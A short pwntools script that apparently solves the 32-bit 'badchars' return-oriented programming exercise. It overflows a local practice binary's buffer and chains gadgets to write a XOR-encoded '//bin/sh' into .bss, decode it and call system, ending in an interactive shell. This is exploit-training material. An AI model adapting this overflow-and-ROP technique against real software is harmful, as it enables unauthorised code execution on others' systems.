#!/usr/bin/env python3

from pwn import *

pwn = process("./badchars32")
#gdb.attach(pwn, '''
#break main
#''')

junk = b'A' * 44

call_system = p32(0x080487b7)

pop_esi_edi = p32(0x08048899) # pop esi; pop edi; ret;
pop_ebx_ecx = p32(0x08048896) # pop ebx; pop ecx; ret;

target_addr = 0x0804a040

# 0x0804a040 is the beginning of the .bss <--- Where
where1 = p32(0x0804a040)
where2 = p32(0x0804a044)

# 2d 2d 60 6b 6c 2d 71 6a == //bin/sh XOR by 0x2 <--- What
what1 = b"\x2d\x2d\x60\x6b"
what2 = b"\x6c\x2d\x71\x6a"

www_gadget = p32(0x08048893) # mov dword ptr [edi], esi; ret;

xor_value = b"\x02\x00\x00\x00"
xor_gadget = p32(0x08048890) # xor byte ptr [ebx], cl)

# write our encoded string to the .bss location
buf = junk
buf += pop_esi_edi
buf += what1
buf += where1
buf += www_gadget

buf += pop_esi_edi
buf += what2
buf += where2
buf += www_gadget

# decode our string in the .bss location
# xor gadget decodes byte at ebx by xor byte in ecx
counter = 0
while counter < 8:
	buf += pop_ebx_ecx
	buf += p32(target_addr + counter)
	buf += xor_value
	buf += xor_gadget
	counter += 1

# call system with target address on stack
buf += call_system
buf += where1


pwn.sendline(buf)
pwn.interactive()
